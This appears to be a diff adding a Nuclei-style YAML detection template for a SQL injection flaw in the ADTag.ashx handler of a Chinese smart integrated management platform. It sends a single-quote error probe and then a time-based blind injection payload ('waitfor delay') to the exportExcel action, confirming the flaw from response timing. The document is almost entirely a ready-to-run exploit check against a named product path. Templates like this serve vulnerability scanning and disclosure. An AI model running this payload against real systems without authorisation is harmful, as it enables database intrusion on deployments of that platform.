@@ -1,0 +1,48 @@
+id: poc-yaml-windor-icmp-adtag-sqli
+info:
+  name: 银达汇智 智慧综合管理平台 ADTag.ashx SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+
+variables:
+  t1: "{{rand_int(4,9)}}"
+  t2: "{{to_number(t1) + 2}}"
+
+http:
+  - id: "1"
+    method: POST
+    path:
+      - "{{BaseURL}}/Module/BPCJ/AD_Tag/Controller/ADTag.ashx"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "action=exportExcel&sTagId='"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [500]
+      - type: word
+        part: body
+        words:
+          - "未将对象引用设置到对象的实例"
+
+  - id: "2"
+    method: POST
+    path:
+      - "{{BaseURL}}/Module/BPCJ/AD_Tag/Controller/ADTag.ashx"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "action=exportExcel&sTagId='waitfor+delay'0:0:{{t1}}'--"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
+      - type: word
+        part: header
+        words:
+          - "SessionId"
+      - type: dsl
+        dsl:
+          - "len(body) == 0"
+          - "duration > to_number(t1)"
+          - "duration < to_number(t2)"
